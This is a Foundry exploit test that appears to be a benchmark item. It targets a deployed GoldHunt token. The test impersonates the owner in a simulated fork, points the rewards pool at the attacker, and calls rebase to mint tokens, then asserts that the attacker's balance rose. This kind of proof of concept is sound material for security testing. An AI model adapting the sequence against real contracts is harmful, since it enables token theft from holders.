pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IGoldHunt {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function setRewardsPool(address _rewardsPool) external;
    function rebase(uint multiple) external;
    function rewardsPool() external view returns (address);
    function transfer(address to, uint256 amount) external returns (bool);
    function setSwapEnable(bool _enable) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x6D3dd96f97b10fc86A7F8607704BBe9936083b89;
    address attacker = address(this);

    // State variables to persist between setUp and test functions
    IGoldHunt token;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IGoldHunt(TARGET);

        // Get initial balance
        uint256 initialBalance = token.balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Get owner address
        owner = token.owner();
        console.log("Contract owner:", owner);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Impersonate the contract owner
        vm.startPrank(owner);

        // Step 2: Disable swap mechanism to prevent interference
        token.setSwapEnable(false);
        console.log("Disabled swap mechanism");

        // Step 3: Transfer some tokens to attacker first (so rebase has a base to multiply)
        uint256 initialTransfer = 1000 * 1e18;
        token.transfer(attacker, initialTransfer);
        console.log("Transferred initial tokens to attacker:", initialTransfer);

        // Step 4: Set rewardsPool to attacker's address
        token.setRewardsPool(attacker);
        console.log("Set rewardsPool to attacker");

        // Step 5: Call rebase with high multiple to mint tokens
        // This will mint: balanceOf(attacker) * (100 - 1) = 1000 * 99 = 99,000 tokens
        token.rebase(100);
        console.log("Called rebase(100)");

        vm.stopPrank();

        // Step 6: Verify the exploit worked - balance should have increased significantly
        uint256 finalBalance = token.balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);
        console.log("Balance increase:", finalBalance - initialTransfer);

        // Oracle check: attacker balance must have increased
        assertGt(finalBalance, initialTransfer, "Attacker balance did not increase");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

